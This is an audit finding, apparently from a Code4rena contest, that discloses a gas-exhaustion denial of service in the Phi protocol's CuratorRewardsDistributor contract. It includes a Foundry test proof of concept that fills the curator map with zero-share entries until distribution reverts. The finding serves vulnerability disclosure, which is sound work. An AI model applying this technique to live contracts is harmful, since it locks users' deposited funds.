# Vulnerability details

## Impact

Permanent Denial of Service in `CuratorRewardsDistributor` for any `credId` when a certain number of curators have bought / sold shares; locking of funds deposited to the `credId`.

## Summary

`CuratorRewardsDistributor::distribute()` requests the curators for a particular `credId` from the `Cred` contract [as follows](
https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/CuratorRewardsDistributor.sol#L84):

```
        address[] memory distributeAddresses = credContract.getCuratorAddresses(credId, 0, 0);
```

In the above, `0` is used for both `start_` and `stop_` parameters of `getCuratorAddresses` function, thus instructing it to retrieve all curators for a particular `credId`. The latter extracts them from [shareBalance](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L46), which is `EnumerableMap.AddressToUintMap` from OZ. `shareBalance` is updated via [_updateCuratorShareBalance](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L666-L682), which always sets the keys for `AddressToUintMap`, but never removes them, even for entries with `0` shares. There can't be more than 999 shares, but `0` entries in the map get accumulated endlessly, thus causing `getCuratorAddresses` to run out of gas when iterating. This results in the permanent DoS for a particular `credId` reward distribution in `CuratorRewardsDistributor`, when a certain number of curators have bought and sold their shares.


## Proof of Concept

Drop this test to [CuratorRewardsDistributor.t.sol](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/test/CuratorRewardsDistributor.t.sol#L36) and execute via `forge test --match-test Kuprum`

```solidity
    function testKuprum_Distribute() public {
        // Do not account for gas usage in preparation phase
        vm.pauseGasMetering();
        uint256 N = 14700; // Number of different cred curators over time
        uint256 credId = 1;
        uint256 depositAmount = 1 ether;

        // Signal creds for different users
        for (uint256 i = 0; i < N; i++) {
            address user = makeAddr(string(abi.encodePacked("user-", i)));
            vm.startPrank(user);
            vm.deal(user, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
            cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
            vm.warp(block.timestamp + 10 minutes + 1 seconds);
            cred.sellShareCred(credId, 1, 0);
            vm.stopPrank();
        }

        vm.startPrank(user1);
        vm.deal(user1, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
        vm.stopPrank();

        // Deposit some ETH to the curatorRewardsDistributor
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

        // Account for gas usage only in this call
        vm.resumeGasMetering();
        vm.prank(owner);
        vm.expectRevert(); // EvmError: OutOfGas
        // Distribute rewards; use the Ethereum/Optimism block gas limit
        curatorRewardsDistributor.distribute{gas: 30_000_000}(credId);
    }
```
